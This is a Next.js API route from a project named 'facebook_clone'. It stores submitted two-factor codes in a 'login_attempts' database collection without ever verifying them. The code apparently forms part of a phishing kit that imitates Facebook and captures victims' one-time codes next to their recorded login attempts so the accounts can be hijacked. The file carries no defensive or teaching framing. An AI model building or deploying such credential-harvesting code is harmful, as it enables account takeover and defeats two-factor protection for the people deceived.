import { type NextRequest, NextResponse } from "next/server"
import { MongoClient, ObjectId } from "mongodb"

const MONGODB_URI = process.env.MONGODB_URI || "mongodb://localhost:27017"
const DB_NAME = process.env.DB_NAME || "facebook_clone"

export async function POST(request: NextRequest) {
  try {
    const { attemptId, twoFactorCode } = await request.json()

    if (!attemptId || !twoFactorCode) {
      return NextResponse.json({ error: "Attempt ID and 2FA code are required" }, { status: 400 })
    }

    // Connect to MongoDB
    const client = new MongoClient(MONGODB_URI)
    await client.connect()

    const db = client.db(DB_NAME)
    const collection = db.collection("login_attempts")

    // Update the login attempt with 2FA code
    await collection.updateOne(
      { _id: new ObjectId(attemptId) },
      {
        $set: {
          twoFactorCode,
          twoFactorTimestamp: new Date(),
        },
      },
    )

    await client.close()

    return NextResponse.json({ message: "2FA code saved successfully" }, { status: 200 })
  } catch (error) {
    console.error("Database error:", error)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}
